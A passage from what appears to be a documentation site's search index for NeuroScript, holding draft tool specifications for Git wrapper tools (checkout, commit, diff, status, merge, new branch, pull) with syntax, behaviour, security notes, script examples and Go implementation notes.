checkout_main_status\n\n# Example 2: Checkout the previously created feature branch\n# Assume 'feature/add-user-auth' was created successfully before\nCALL Git.GitCheckout(\"feature/add-user-auth\")\nSET checkout_feature_status = LAST\nEMIT \"Checkout 'feature/add-user-auth' status: \" + checkout_feature_status\n\n# Example 3: Attempt to checkout a non-existent branch\nCALL Git.GitCheckout(\"no-such-branch-exists\")\nSET non_existent_status = LAST\nEMIT \"Status for checking out non-existent branch: \" + non_existent_status\n# Expect error like: \"failed to checkout branch/ref 'no-such-branch-exists': error: pathspec 'no-such-branch-exists' did not match any file(s) known to git.\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitCheckout</code></li> <li>Spec Name: <code>GitCheckout</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_commit/","title":"git_commit","text":"<p>@@@:: type: NSproject @@@:: subtype: tool_spec @@@:: version: 0.1.0 @@@:: id: tool-spec-git-gitcommit-v0.1 @@@:: status: draft @@@:: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md @@@:: relatedTo: Git.GitAdd, Git.GitStatus @@@:: developedBy: AI @@@:: reviewedBy: User @@@ @@@# Tool Specification Structure Template @@@ @@@## Tool Specification: <code>Git.GitCommit</code> (v0.1) @@@ @@@ Tool Name: <code>Git.GitCommit</code> (v0.1) @@@ Purpose: Creates a new commit containing the currently staged changes. This is equivalent to running <code>git commit -m \"&lt;message&gt;\"</code> within the project's sandbox directory. @@@ NeuroScript Syntax: <code>CALL Git.GitCommit(message: &lt;String&gt;)</code> @@@ Arguments: @@@    * <code>message</code> (String): Required. The commit message describing the changes being committed. This message cannot be an empty string. @@@ Return Value: (String) @@@    * On success: A string indicating the commit was successful, including the commit message and potentially output from the <code>git commit</code> command. Example: <code>\"GitCommit successful. Message: \"Fix typo in README\".\\nOutput:\\n[main abc1234] Fix typo in README\\n 1 file changed, 1 insertion(+), 1 deletion(-)\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>). @@@    * On error: A string describing the failure. This could be due to an empty commit message (\"commit message cannot be empty\"), nothing being staged for commit, or other errors from the underlying <code>git commit</code> command execution (e.g., \"GitCommit failed: ...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>). @@@ Behavior: @@@    1.  Validates that exactly one argument (<code>message</code>) of type String is provided. @@@    2.  Validates that the <code>message</code> is not empty. If it is, returns an error message string. @@@    3.  Retrieves the interpreter's <code>sandboxDir</code>. @@@    4.  Constructs a command equivalent to <code>git commit -m \"&lt;message&gt;\"</code>. @@@    5.  Executes the <code>git commit</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. @@@    6.  If the command execution fails (e.g., <code>git</code> not found, nothing staged, commit hook failure), returns an error message string containing details from <code>toolExec</code>. @@@    7.  If the command execution succeeds, returns a success message string, including the original commit message and any standard output from the <code>git commit</code> command. @@@ Security Considerations: @@@    * Executes the <code>git commit</code> command within the configured sandbox directory. @@@    * Modifies the Git repository history by creating a new commit object. @@@    * Relies on the <code>toolExec</code> helper for command execution. @@@    * Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running. @@@ Examples: @@@    <code>neuroscript @@@    # Example 1: Commit previously staged changes @@@    # Assume Git.GitAdd([\"README.md\"]) was called successfully before @@@    SET commit_message = \"Update project README with installation instructions\" @@@    CALL Git.GitCommit(commit_message) @@@    SET commit_status = LAST @@@    EMIT \"Git Commit status: \" + commit_status @@@ @@@    # Example 2: Attempt to commit with nothing staged (will likely fail) @@@    EMIT \"Attempting commit with nothing staged...\" @@@    CALL Git.GitCommit(\"Add new feature X\") @@@    SET nothing_staged_status = LAST @@@    EMIT \"Status for commit with nothing staged: \" + nothing_staged_status @@@    # Expect error like: \"GitCommit failed: On branch main\\nnothing to commit, working tree clean...\" @@@ @@@    # Example 3: Attempt to commit with an empty message (will fail validation) @@@    CALL Git.GitCommit(\"\") @@@    SET empty_message_status = LAST @@@    EMIT \"Status for commit with empty message: \" + empty_message_status @@@    # Expect error like: \"commit message cannot be empty...\" @@@</code> @@@ Go Implementation Notes:* @@@    * Location: <code>pkg/core/tools_git.go</code> @@@    * Function: <code>toolGitCommit</code> @@@    * Spec Name: <code>GitCommit</code> (in <code>pkg/core/tools_git_register.go</code>) @@@    * Key Go Packages: <code>fmt</code> @@@    * Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code> @@@    * Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</p>"},{"location":"ns/tools/git_diff/","title":"git_diff","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-diff-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: git.Status, git.Add :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_diff/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_diff/#tool-specification-gitdiff-v01","title":"Tool Specification: <code>git.Diff</code> (v0.1)","text":"<ul> <li>Tool Name: <code>git.Diff</code> (v0.1)</li> <li>Purpose: Shows the differences between the files in the working directory and the Git index (staging area). It highlights changes that have been made but not yet staged for commit. This is equivalent to running <code>git diff</code> (with no arguments) within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL git.Diff()</code></li> <li>Arguments: None.</li> <li>Return Value: (String)<ul> <li>On success:<ul> <li>If changes exist between the working tree and the index: Returns a string containing the textual diff output in the standard <code>git diff</code> format. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>If there are no changes between the working tree and the index: Returns the specific string <code>\"GitDiff: No changes detected in the working tree.\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>On failure: A string describing the failure, typically indicating a fatal error from the underlying <code>git diff</code> command execution (e.g., \"GitDiff command failed: fatal: not a git repository...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git diff</code>.</li> <li>Executes the <code>git diff</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. Note that <code>git diff</code> typically exits successfully (exit code 0) even when differences are found.</li> <li>If the command execution fails (e.g., <code>git</code> not found, not a Git repository), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, checks the standard output returned by <code>toolExec</code>:<ul> <li>If the output string is empty, returns the specific message <code>\"GitDiff: No changes detected in the working tree.\"</code>.</li> <li>If the output string is not empty, returns the raw diff output string directly.</li> </ul> </li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git diff</code> command within the configured sandbox directory.</li> <li>Reads Git repository metadata and file content from the working directory and index to generate the diff; does not modify the repository state or files.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Show diff after modifying a tracked file\n# Assume README.md is tracked\nCALL FS.WriteFile(\"README.md\", \"Add a new line to the README.\")\nSET write_ok = LAST\n\nEMIT \"Showing diff after modifying README...\"\nCALL git.Diff()\nSET diff_output = LAST\nEMIT \"Git Diff Output:\"\nEMIT diff_output\n# Expected output will show the diff for README.md\n\n# Example 2: Show diff when working tree is clean (matches index)\n# Assume previous change was added and committed, or no changes made\nCALL git.Diff()\nSET clean_diff_output = LAST\nEMIT \"Git Diff Output (Clean): \" + clean_diff_output\n# Expect: \"GitDiff: No changes detected in the working tree.\"\n\n# Example 3: Add the change, then show diff (should be clean again)\nCALL git.GitAdd([\"README.md\"]) # Stage the change from Example 1\nSET add_ok = LAST\n\nCALL git.Diff()\nSET diff_after_add = LAST\nEMIT \"Git Diff Output (After Add): \" + diff_after_add\n# Expect: \"GitDiff: No changes detected in the working tree.\"\n# Note: To see staged changes vs HEAD, one would need 'git diff --staged' functionality\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitDiff</code></li> <li>Spec Name: <code>GitDiff</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Handles the \"no changes\" case specifically.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_gitstatus/","title":"git_gitstatus","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitstatus-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git_status.go, docs/script_spec.md :: relatedTo: Git.GitAdd, Git.GitCommit, Git.GitCheckout :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_gitstatus/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_gitstatus/#tool-specification-gitgitstatus-v01","title":"Tool Specification: <code>Git.GitStatus</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitStatus</code> (v0.1)</li> <li>Purpose: Retrieves the status of the Git repository within the sandbox, providing detailed information about the current branch, tracking status, and changes to files. It uses <code>git status --porcelain -b --untracked-files=all</code> internally and parses the output.</li> <li>NeuroScript Syntax: <code>CALL Git.GitStatus()</code></li> <li>Arguments: None.</li> <li>Return Value: (Map)<ul> <li>Returns a Map containing a structured representation of the Git status. (Accessible via <code>LAST</code> after the <code>CALL</code>). The Map always contains the following keys:<ul> <li><code>branch</code> (String | nil): The name of the current local branch. Can be <code>\"(detached HEAD)\"</code> if not on a branch, or the branch name if on an unborn branch (e.g., after <code>git init</code> but before first commit). <code>nil</code> only if parsing fails unexpectedly.</li> <li><code>remote_branch</code> (String | nil): The name of the remote tracking branch (e.g., <code>origin/main</code>), or <code>nil</code> if the current branch is not tracking a remote branch.</li> <li><code>ahead</code> (Number): The number of commits the local branch is ahead of its remote tracking branch. <code>0</code> if not tracking or up-to-date.</li> <li><code>behind</code> (Number): The number of commits the local branch is behind its remote tracking branch. <code>0</code> if not tracking or up-to-date.</li> <li><code>files</code> (List of Maps): A list containing information about files with changes (staged, unstaged, or untracked). Each map in the list has:<ul> <li><code>path</code> (String): The relative path to the file within the repository. Paths with special characters may be unquoted from Git's C-style quoting.</li> <li><code>index_status</code> (String): A single character representing the status of the file in the index (staging area). Common values: <code>M</code> (modified), <code>A</code> (added), <code>D</code> (deleted), <code>R</code> (renamed), <code>C</code> (copied), <code>U</code> (unmerged), <code>?</code> (untracked), <code>!</code> (ignored), <code></code> (unmodified).</li> <li><code>worktree_status</code> (String): A single character representing the status of the file in the working tree relative to the index. Common values: <code>M</code> (modified), <code>D</code> (deleted), <code>?</code> (untracked), <code></code> (unmodified/tracked).</li> <li><code>original_path</code> (String | nil): For renamed (<code>R</code>) or copied (<code>C</code>) files in the index, this holds the original path the file was renamed/copied from. Otherwise, it is <code>nil</code>. May be unquoted.</li> </ul> </li> <li><code>untracked_files_present</code> (Boolean): <code>true</code> if there are any files listed with status <code>??</code> (untracked), <code>false</code> otherwise.</li> <li><code>is_clean</code> (Boolean): <code>true</code> only if there are no staged changes, no unstaged changes to tracked files, AND no untracked files. <code>false</code> otherwise.</li> <li><code>error</code> (String | nil): Contains an error message string if the <code>git status</code> command failed (e.g., \"Not a git repository...\") or if the output parsing failed. Contains <code>nil</code> if the command executed successfully and parsing succeeded (even if the repository is not clean).</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Executes the command <code>git status --porcelain -b --untracked-files=all</code> within the <code>sandboxDir</code> using the <code>toolExec</code> helper.</li> <li>If <code>toolExec</code> returns an error (e.g., the directory is not a Git repository):<ul> <li>Creates a default result Map.</li> <li>Sets the <code>error</code> key in the Map with a descriptive message based on the error.</li> <li>Returns the Map.</li> </ul> </li> <li>If <code>toolExec</code> succeeds, parses the output string line by line:<ul> <li>Parses the first line (starting with <code>##</code>) to extract local branch, remote branch (if tracked), and ahead/behind counts. Handles detached HEAD and unborn branch states.</li> <li>Parses subsequent lines to identify file statuses (staged, unstaged, untracked, renamed/copied). Extracts the status codes (index, worktree) and paths (handling C-style quoting and <code>-&gt;</code> for renames/copies).</li> <li>Populates the <code>files</code> list with maps containing the parsed file status details.</li> <li>Sets <code>untracked_files_present</code> if any <code>??</code> files are found.</li> <li>Determines <code>is_clean</code> based on whether any tracked file changes or untracked files were detected.</li> </ul> </li> <li>If parsing fails at any stage, sets the <code>error</code> key in the result Map.</li> <li>Returns the fully populated result Map.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git status</code> command within the configured sandbox directory.</li> <li>Reads Git repository metadata and file status information; does not modify the repository state or files.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Get status of a clean repository on main branch\n# Assume repo is clean and on 'main' tracking 'origin/main'\nCALL Git.GitStatus()\nSET status_result = LAST\nEMIT \"Clean Repo Status:\"\nEMIT \" Branch: \" + status_result[\"branch\"]\nEMIT \" Remote: \" + status_result[\"remote_branch\"]\nEMIT \" Ahead: \" + status_result[\"ahead\"] + \", Behind: \" + status_result[\"behind\"]\nEMIT \" Is Clean: \" + status_result[\"is_clean\"]\nEMIT \" Untracked Present: \" + status_result[\"untracked_files_present\"]\nEMIT \" Error: \" + status_result[\"error\"]\nEMIT \" Files Count: \" + List.Length(status_result[\"files\"]) # Requires List.Length\n# Expected: main, origin/main, 0, 0, true, false, nil, 0 (if List.Length exists)\n\n# Example 2: Get status after modifying and adding a file\nCALL FS.WriteFile(\"config.yml\", \"new_setting: true\")\nCALL Git.GitAdd([\"config.yml\"])\nCALL Git.GitStatus()\nSET modified_status = LAST\nEMIT \"Modified Repo Status:\"\nEMIT \" Is Clean: \" + modified_status[\"is_clean\"] # Expect false\nEMIT \" Error: \" + modified_status[\"error\"] # Expect nil\n# Loop through files to see details (requires List tools)\nIF modified_status[\"error\"] == nil AND List.Length(modified_status[\"files\"]) &gt; 0 THEN\n  SET changed_file = modified_status[\"files\"][0]\n  EMIT \" Changed File Path: \" + changed_file[\"path\"] # Expect config.yml\n  EMIT \" Index Status: \" + changed_file[\"index_status\"] # Expect 'A' (Added)\n  EMIT \" Worktree Status: \" + changed_file[\"worktree_status\"] # Expect ' '\nENDIF\n\n# Example 3: Get status in a non-git directory\n# Assume \"not_a_repo\" directory exists but is not a git repo\n# This requires changing the interpreter's sandboxDir, which isn't standard tool behavior.\n# Illustrative result if run in non-repo:\n# CALL Git.GitStatus()\n# SET non_repo_status = LAST\n# EMIT \"Non-Repo Status Error: \" + non_repo_status[\"error\"]\n# Expect error like: \"Not a git repository...\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git_status.go</code></li> <li>Function: <code>toolGitStatus</code> (calls <code>parseGitStatusOutput</code>)</li> <li>Spec Name: <code>GitStatus</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>regexp</code>, <code>strconv</code>, <code>strings</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.parseGitStatusOutput</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>map[string]interface{}, error</code>, but execution/parsing errors are placed in the returned map's <code>error</code> field instead of returning a Go error.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_merge/","title":"git_merge","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitmerge-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitNewBranch, Git.GitCheckout, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_merge/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_merge/#tool-specification-gitgitmerge-v01","title":"Tool Specification: <code>Git.GitMerge</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitMerge</code> (v0.1)</li> <li>Purpose: Merges the history of a named branch into the current branch. This is equivalent to running <code>git merge &lt;branch_name&gt;</code> within the project's sandbox directory. It reports merge conflicts via the error return value.</li> <li>NeuroScript Syntax: <code>CALL Git.GitMerge(branch_name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>branch_name</code> (String): Required. The name of the branch whose history should be merged into the currently checked-out branch. It cannot be an empty string.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success (clean merge): A string indicating the merge was successful, potentially including output from the <code>git merge</code> command. Example: <code>\"Successfully merged branch 'feature/login'.\\nOutput:\\nMerge made by the 'recursive' strategy...\\n\"</code> (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On failure or conflict: A string describing the failure. This could be due to an empty <code>branch_name</code>, or errors from the underlying <code>git merge</code> command execution (e.g., \"failed to merge branch '...': \"). The output from <code>git merge</code> will be included in the error message if conflicts occur (e.g., mentioning \"Automatic merge failed; fix conflicts and then commit the result.\"). (Accessible via <code>LAST</code> after the <code>CALL</code>). <li>Behavior:<ol> <li>Validates that exactly one argument (<code>branch_name</code>) of type String is provided.</li> <li>Validates that the <code>branch_name</code> is not empty. If it is, returns an error message string.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git merge \"&lt;branch_name&gt;\"</code>.</li> <li>Executes the <code>git merge</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, branch does not exist, merge conflicts occur), returns an error message string containing details from <code>toolExec</code> (which includes Git's standard error/output for conflicts).</li> <li>If the command execution succeeds (a clean merge), returns a success message string, including the merged branch name and any standard output from the <code>git merge</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git merge</code> command within the configured sandbox directory.</li> <li>Modifies the Git repository state: potentially creates a merge commit, updates the current branch reference, and modifies files in the working directory and index.</li> <li>Does not automatically resolve merge conflicts; it relies on the user or subsequent script steps to handle conflicts reported in the error output.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Setup: Create a main branch commit, then a feature branch with another commit\nCALL FS.WriteFile(\"base.txt\", \"Line 1\")\nCALL Git.GitAdd([\"base.txt\"])\nCALL Git.GitCommit(\"Initial commit on main\")\nCALL Git.GitNewBranch(\"feature/add-line2\")\nCALL FS.WriteFile(\"base.txt\", \"Line 1\\nLine 2\") # Modify on feature branch\nCALL Git.GitAdd([\"base.txt\"])\nCALL Git.GitCommit(\"Add line 2 on feature branch\")\nCALL Git.GitCheckout(\"main\") # Switch back to main\n\n# Example 1: Perform a clean merge (fast-forward or simple merge)\nEMIT \"Attempting to merge 'feature/add-line2' into 'main'...\"\nCALL Git.GitMerge(\"feature/add-line2\")\nSET merge_status = LAST\nEMIT \"Merge status: \" + merge_status\n# Expected output should indicate success\n\n# Example 2: Attempt to merge a non-existent branch\nEMIT \"Attempting to merge non-existent branch...\"\nCALL Git.GitMerge(\"no-such-branch\")\nSET non_exist_merge_status = LAST\nEMIT \"Status for merging non-existent branch: \" + non_exist_merge_status\n# Expect error like: \"failed to merge branch 'no-such-branch': fatal: 'no-such-branch' does not point to a commit\"\n\n# Example 3: Simulate a conflict scenario (manual setup needed outside script usually)\n# Assume 'main' has a change conflicting with 'feature/add-line2' before merge attempt\n# CALL Git.GitMerge(\"feature/add-line2\")\n# SET conflict_status = LAST\n# EMIT \"Status for conflicting merge: \" + conflict_status\n# Expect error containing text like: \"Automatic merge failed; fix conflicts and then commit the result.\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitMerge</code></li> <li>Spec Name: <code>GitMerge</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Merge conflicts are reported via the wrapped error from <code>toolExec</code>.</li> </ul> </li>"},{"location":"ns/tools/git_newbranch/","title":"git_newbranch","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitnewbranch-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitCheckout, Git.GitCommit :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_newbranch/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_newbranch/#tool-specification-gitgitnewbranch-v01","title":"Tool Specification: <code>Git.GitNewBranch</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitNewBranch</code> (v0.1)</li> <li>Purpose: Creates a new branch starting from the current HEAD and immediately switches to it. This is equivalent to running <code>git checkout -b &lt;branch_name&gt;</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitNewBranch(branch_name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>branch_name</code> (String): Required. The name for the new branch. It cannot be empty and must not contain characters typically disallowed in Git branch names (e.g., whitespace, <code>\\</code>, <code>:</code>, <code>*</code>, <code>?</code>, <code>\"</code>, <code>&lt;</code>, <code>&gt;</code>, <code>|</code>, <code>~</code>, <code>^</code>).</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating the new branch was created and checked out successfully, potentially including output from the <code>git checkout -b</code> command. Example: <code>\"Successfully created and checked out new branch 'feature/login'.\\nOutput:\\nSwitched to a new branch 'feature/login'\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to an invalid branch name (e.g., \"branch name cannot be empty\", \"branch name '...' contains invalid characters\") or errors from the underlying <code>git checkout -b</code> command execution (e.g., \"failed to create new branch '...': fatal: A branch named '...' already exists\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>branch_name</code>) of type String is provided.</li> <li>Validates that the <code>branch_name</code> is not empty. If it is, returns an error message string.</li> <li>Validates that the <code>branch_name</code> does not contain invalid characters (<code>\\t\\n\\\\/:*?\\\"&lt;&gt;|~^</code>). If it does, returns an error message string.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git checkout -b \"&lt;branch_name&gt;\"</code>.</li> <li>Executes the <code>git checkout -b</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, branch already exists), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including the new branch name and any standard output from the <code>git checkout -b</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git checkout -b</code> command within the configured sandbox directory.</li> <li>Modifies the Git repository state by creating a new branch reference and updating the HEAD to point to this new branch.</li> <li>Includes basic validation against common invalid characters in branch names.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create a new feature branch\nSET new_branch = \"feature/add-user-auth\"\nCALL Git.GitNewBranch(new_branch)\nSET create_status = LAST\nEMIT \"Create branch status: \" + create_status\n\n# Example 2: Attempt to create a branch that already exists (assuming 'main' exists)\nCALL Git.GitNewBranch(\"main\")\nSET exists_status = LAST\nEMIT \"Status for creating existing branch: \" + exists_status\n# Expect error like: \"failed to create new branch 'main': fatal: A branch named 'main' already exists\"\n\n# Example 3: Attempt to create a branch with an invalid name\nCALL Git.GitNewBranch(\"invalid name with spaces\")\nSET invalid_name_status = LAST\nEMIT \"Status for creating branch with invalid name: \" + invalid_name_status\n# Expect error like: \"branch name 'invalid name with spaces' contains invalid characters...\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitNewBranch</code></li> <li>Spec Name: <code>GitNewBranch</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>strings</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_pull/","title":"git_pull","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitpull-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitPush, Git.GitFetch, Git.GitMerge, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_pull/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_pull/#tool-specification-gitgitpull-v01","title":"Tool Specification: <code>Git.GitPull</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitPull</code> (v0.1)</li> <li>Purpose: Fetches changes from the default remote repository (usually 'origin') for the current branch and integrates them into the local branch. This is equivalent to running <code>git pull</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitPull()</code></li> <li>Arguments: None.</li> <li>Return Value: (String)<ul> <li>On success (fetch and integrate successful): A string indicating the pull was successful, potentially including output from the <code>git pull</code> command. Example: <code>\"GitPull successful.\\nOutput:\\nUpdating abc1234..def5678\\nFast-forward\\n file.txt | 2 +-\\n 1 file changed, 1 insertion(+), 1 deletion(-)\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On failure or conflict: A string describing the failure, typically wrapping the output from the <code>git pull</code> command. Examples: <code>\"GitPull failed: ...\"</code>. This can occur due to network errors, authentication issues, merge conflicts during integration, or if the local repository has uncommitted changes preventing the pull. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git pull</code>.</li> <li>Executes the <code>git pull</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. This involves contacting the configured remote repository.</li> <li>If the command execution fails (e.g., network error, remote not found, authentication required/failed, merge conflicts), returns an error message string containing details from <code>toolExec</code> (which includes Git's standard error/output).</li> <li>If the command execution succeeds (fetch and merge/rebase completed cleanly), returns a success message string, including any standard output from the <code>git pull</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git pull</code> command within the configured sandbox directory.</li> <li>Requires network access to contact the remote repository. Firewall rules may need to allow outgoing connections.</li> <li>May require authentication (e.g., SSH keys, HTTPS credentials) configured in the execution environment's Git settings to access private repositories. The tool itself does not handle credential input.</li> <li>Modifies the Git repository state by fetching new objects, updating remote-tracking branches, and potentially creating a merge commit or fast-forwarding the current branch reference. It can also modify files in the working directory and index during the integration step.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Pull changes for the current branch (assuming remote 'origin' is set up)\nEMIT \"Attempting to pull latest changes...\"\nCALL Git.GitPull()\nSET pull_status = LAST\nEMIT \"Git Pull status: \" + pull_status\n# Output will vary greatly depending on whether changes exist, conflicts occur, etc.\n\n# Example 2: Check status after pull\nCALL Git.GitStatus()\nSET status_after_pull = LAST\nIF status_after_pull[\"error\"] == nil THEN\n   EMIT \"Repository is clean after pull: \" + status_after_pull[\"is_clean\"]\n   # Check if behind count is now 0 (assuming pull was successful)\n   EMIT \"Commits behind remote after pull: \" + status_after_pull[\"behind\"]\nELSE\n   EMIT \"Error getting status after pull: \" + status_after_pull[\"error\"]\nENDIF\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitPull</code></li> <li>Spec Name: <code>GitPull</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Merge conflicts or other issues are reported via the wrapped error from <code>toolExec</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_push/","title":"git_push","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitpush-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, 